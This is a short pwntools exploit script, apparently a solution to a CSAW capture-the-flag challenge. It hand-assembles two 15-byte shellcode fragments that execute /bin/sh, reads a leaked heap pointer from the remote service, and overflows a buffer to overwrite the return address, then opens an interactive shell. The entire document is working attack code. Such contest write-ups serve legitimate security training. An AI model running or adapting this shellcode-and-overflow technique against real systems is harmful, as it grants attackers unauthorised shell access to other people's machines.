from pwn import *

context.arch = 'amd64'

# Hand-crafted shellcode to fit in 2 x 15 bytes
shc1 = '''
movabs rbx, 0x68732f2f6e69622f  ; /bin//sh
'''
shc1 = asm(shc1)
# pwn.asm won't assemble this; we must do it by hand 
offset = (0x18 - len(shc1)) + 0x8  # buffer is 0x18 bytes, then 0x8 for next ptr
# [jump short rel8] is [0xeb [offset - 2]] because offset is from instr start
shc1 += b'\xeb' + p8(offset - 2)
print('shc1 is %d bytes' % len(shc1))
assert(len(shc1) <= 15)

shc2 = '''
xor esi, esi
push rsi
push rbx
push rsp
pop rdi
push 59
pop rax
syscall
'''
shc2 = asm(shc2)
print('shc2 is %d bytes' % len(shc2))
assert(len(shc2) <= 15)

print(disasm(shc1 + shc2))

r = remote('pwn.chal.csaw.io', 9005)

# send in reverse order as second buffer is filled first
r.sendline(shc2)
r.sendline(shc1)

r.recvuntil('node.next: ')
bottom = int(r.recvline(), 16)
print('node.next @ %x' % bottom)
dest = p64(bottom + 0x08)   # next pointer is 0x8 bytes, then shellcode

r.sendline(b'\xff' * (0x8 + 0x3) + dest)  # buffer: 0x3, old rbp: 0x8, then return addr

r.clean()
r.interactive()
